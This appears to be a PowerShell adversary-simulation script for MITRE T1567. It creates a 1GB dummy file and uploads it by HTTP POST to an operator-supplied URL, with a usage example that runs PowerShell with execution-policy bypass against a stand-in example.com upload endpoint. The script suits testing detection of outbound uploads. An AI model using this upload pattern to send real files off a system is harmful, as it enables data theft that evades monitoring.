<#
    T1567 - Exfiltration Over Web Service
    Create a 1GB file and upload it to an url of your choice 
#>


param (
    [Parameter(Mandatory=$false)]
    [string]$url
)

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

if (-not $url){
    Write-Host -ForegroundColor Red "Error: You must provide an url as argument to send data to.`nExample usage: powershell -ep Bypass -File exfiltrate_data_http.ps1 -url `"https://example.com/upload.php`""
    exit 1
}

try {
        
    Write-Host -ForegroundColor Cyan "Creating file with 1GB size"
    $FilePath = "$env:tmp\exfiltration.txt"
    $f = new-object System.IO.FileStream $FilePath, Create, ReadWrite
    $f.SetLength(1GB)
    $f.Close()
    if ((Get-Item $FilePath).Length -eq 1GB){
        Write-Host -ForegroundColor Green "Success: File $FilePath created with size of 1GB"
        $FieldName = 'document'
        $ContentType = 'text/plain'
        $FileStream = [System.IO.FileStream]::new($FilePath, [System.IO.FileMode]::Open)
        $FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data')
        $FileHeader.Name = $FieldName
        $FileHeader.FileName = Split-Path -leaf $FilePath
        $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
        $FileContent.Headers.ContentDisposition = $FileHeader
        $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse($ContentType)
        $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
        $MultipartContent.Add($FileContent)
        Write-Host -ForegroundColor Cyan "Uploading file content to $url ..."
        Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri $url -Verbose 
        Remove-Item $filePath -Verbose -Force
    }
    else{
        Write-Host -ForegroundColor Red "Error: Cannot create $filePath with size of 1GB"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
